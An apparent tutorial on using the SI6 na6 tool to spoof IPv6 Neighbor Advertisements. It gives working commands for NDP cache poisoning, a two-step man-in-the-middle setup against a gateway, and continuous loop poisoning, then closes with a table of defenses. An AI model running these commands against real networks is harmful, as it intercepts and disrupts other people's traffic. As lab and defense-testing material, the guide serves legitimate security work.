# How to Use the SI6 Networks na6 Tool for Neighbor Advertisement Attacks

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: SI6 Networks, Na6, IPv6, Neighbor Advertisement, NDP Spoofing, Security Testing

Description: A guide to using the SI6 Networks na6 tool to test IPv6 Neighbor Advertisement spoofing and NDP cache poisoning in authorized lab environments.

The `na6` tool from the SI6 Networks IPv6 toolkit crafts and sends ICMPv6 Neighbor Advertisement (NA) messages - the IPv6 equivalent of ARP replies. By sending spoofed NAs, attackers can perform NDP cache poisoning to redirect traffic in a man-in-the-middle attack. `na6` enables security researchers to test these attacks in authorized lab environments.

**Warning**: NDP spoofing on production networks is illegal and causes traffic disruption. Only use in isolated lab environments with explicit authorization.

## Installing the SI6 Networks Toolkit

```bash
sudo apt-get install ipv6toolkit   # Debian/Ubuntu
# Arch Linux: install the AUR package named ipv6toolkit, or build from source
```

## Basic na6 Usage

```bash
# Send a Neighbor Advertisement from eth0 to a specific host

sudo na6 -i eth0 -d 2001:db8::20 -t 2001:db8::10 -E 00:11:22:33:44:55

# Send an NA claiming to be the owner of a specific address
sudo na6 -i eth0 -s 2001:db8::10 -d 2001:db8::20 -t 2001:db8::10 -E 00:11:22:33:44:55

# -s = IPv6 source address for the NA packet
# -d = destination (who receives the NA)
# -t = target address in the NA (the address you're claiming to own)
# -E = target link-layer address option (the MAC address advertised for -t)

# Send to all-nodes multicast (affects all hosts on segment)
sudo na6 -i eth0 -s 2001:db8::1 -d ff02::1 -t 2001:db8::1 -E 00:11:22:33:44:55
```

## NDP Cache Poisoning (MITM Setup)

To perform a MITM attack by poisoning the NDP cache of two hosts:

```bash
# Step 1: Tell Host A that you are the gateway
# Claim 2001:db8::1 (gateway) to Host A (2001:db8::10)
sudo na6 -i eth0 \
  -s 2001:db8::1 \
  -d 2001:db8::10 \
  -t 2001:db8::1 \
  -E 00:11:22:33:44:55 \
  --override

# Step 2: Tell the gateway that you are Host A
# Claim 2001:db8::10 (Host A) to the gateway (2001:db8::1)
sudo na6 -i eth0 \
  -s 2001:db8::10 \
  -d 2001:db8::1 \
  -t 2001:db8::10 \
  -E 00:11:22:33:44:55 \
  --override

# Step 3: Enable IPv6 forwarding to pass traffic through
sudo sysctl -w net.ipv6.conf.all.forwarding=1
```

## NA Flags

```bash
# Set the Router (R) flag
sudo na6 -i eth0 -d 2001:db8::20 -t 2001:db8::1 -E 00:11:22:33:44:55 --router

# Set the Solicited (S) flag (response to NS)
sudo na6 -i eth0 -d 2001:db8::20 -t 2001:db8::1 -E 00:11:22:33:44:55 --solicited

# Set the Override (O) flag (forces cache update)
sudo na6 -i eth0 -d 2001:db8::20 -t 2001:db8::1 -E 00:11:22:33:44:55 --override

# All flags combined
sudo na6 -i eth0 -d 2001:db8::20 -t 2001:db8::1 -E 00:11:22:33:44:55 --router --solicited --override
```

## Target Link-Layer Address (TLLA) Option

The TLLA option maps an IPv6 address to a MAC address:

```bash
# Spoof the link-layer address in the NA
sudo na6 -i eth0 \
  -s 2001:db8::1 \
  -d ff02::1 \
  -t 2001:db8::1 \
  -E 00:11:22:33:44:55    # Your attacker MAC
```

## Continuous Poisoning

NDP cache entries expire; continuous poisoning is needed to maintain the MITM position:

```bash
# Send NA every 2 seconds (loop mode)
sudo na6 -i eth0 -s 2001:db8::1 -d ff02::1 -t 2001:db8::1 -E 00:11:22:33:44:55 --override --loop --sleep 2
```

## Monitoring NDP Cache

```bash
# View the NDP cache on a Linux host
ip -6 neigh show

# Watch for changes
watch -n 1 'ip -6 neigh show'
```

## Defenses Against NA Spoofing

| Defense | Implementation |
|---|---|
| SEND (RFC 3971) | Cryptographically signed NDP messages |
| NDPMon | Detects unexpected NDP changes |
| Dynamic ARP-like inspection | Managed switch NDP inspection |
| Static NDP entries | `ip -6 neigh add ... nud permanent` |
| SeND-enabled routers | Validates NDP with certificates |

```bash
# Create a permanent (static) NDP entry to prevent spoofing
sudo ip -6 neigh add 2001:db8::1 \
  lladdr 00:11:22:33:44:55 \
  dev eth0 \
  nud permanent
```

`na6` testing helps identify whether your network is vulnerable to NDP cache poisoning attacks, enabling you to implement appropriate countermeasures before real attackers exploit the vulnerability.
